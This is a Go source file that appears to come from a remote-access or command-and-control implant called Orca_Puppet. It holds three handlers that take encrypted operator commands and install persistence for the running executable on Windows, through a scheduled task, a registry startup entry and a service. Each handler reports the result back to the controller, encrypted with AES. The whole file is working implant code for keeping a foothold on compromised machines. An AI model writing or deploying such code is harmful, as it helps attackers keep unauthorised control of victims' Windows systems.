package controller

import (
	"Orca_Puppet/cli/cmdopt/persistopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

func persistTaskschCmd(sendUserId, decData string) {
	type TaskSchStruct struct {
		TaskName string
		TaskPath string
		TaskArgs string
		TaskTime time.Time
	}
	var taskSchStruct TaskSchStruct
	err := json.Unmarshal([]byte(decData), &taskSchStruct)
	if err != nil {
		return
	}
	if strings.TrimSpace(taskSchStruct.TaskPath) == "" {
		path, _ := util.GetExecPath()
		splits := strings.Split(path, " ")
		taskSchStruct.TaskPath = splits[0]
		taskSchStruct.TaskArgs = strings.Join(splits[1:], " ")
	}

	err = persistopt.AddWinTask(taskSchStruct.TaskName, taskSchStruct.TaskPath, taskSchStruct.TaskArgs, taskSchStruct.TaskTime)
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, fmt.Sprintf("task add failed: %s", err))
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "persistTaskschAdd_ret", outputMsg, "")
		return
	}
	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, fmt.Sprintf("task add successfully"))
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "persistTaskschAdd_ret", outputMsg, "")
}

func persistRegistryCmd(sendUserId, decData string) {
	type RegistryStruct struct {
		RegName string
		RegPath string
		RegArgs string
		RegKey  string
	}
	var regStruct RegistryStruct
	err := json.Unmarshal([]byte(decData), &regStruct)
	if err != nil {
		return
	}
	if strings.TrimSpace(regStruct.RegPath) == "" {
		path, _ := util.GetExecPath()
		splits := strings.Split(path, " ")
		regStruct.RegPath = splits[0]
		regStruct.RegArgs = strings.Join(splits[1:], " ")
	}

	err = persistopt.AddWinReg(regStruct.RegName, regStruct.RegPath, regStruct.RegArgs, regStruct.RegKey)
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, fmt.Sprintf("startup item add failed: %s", err))
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "persistRegistryAdd_ret", outputMsg, "")
		return
	}
	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, fmt.Sprintf("startup item add successfully"))
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "persistRegistryAdd_ret", outputMsg, "")
}

func persistSvcCmd(sendUserId, decData string) {
	type SvcStruct struct {
		SvcName    string
		SvcPath    string
		SvcArgs    string
		SvcDesc    string
		SvcStarted bool
	}
	var svcStruct SvcStruct
	err := json.Unmarshal([]byte(decData), &svcStruct)
	if err != nil {
		return
	}
	if strings.TrimSpace(svcStruct.SvcPath) == "" {
		path, _ := util.GetExecPath()
		splits := strings.Split(path, " ")
		svcStruct.SvcPath = splits[0]
		svcStruct.SvcArgs = strings.Join(splits[1:], " ")
	}

	err = persistopt.AddWinSvc(svcStruct.SvcName, svcStruct.SvcPath, svcStruct.SvcArgs, svcStruct.SvcDesc, svcStruct.SvcStarted)
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, fmt.Sprintf("service add failed: %s", err))
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "persistSvcAdd_ret", outputMsg, "")
		return
	}
	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, fmt.Sprintf("service add successfully"))
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "persistSvcAdd_ret", outputMsg, "")
}
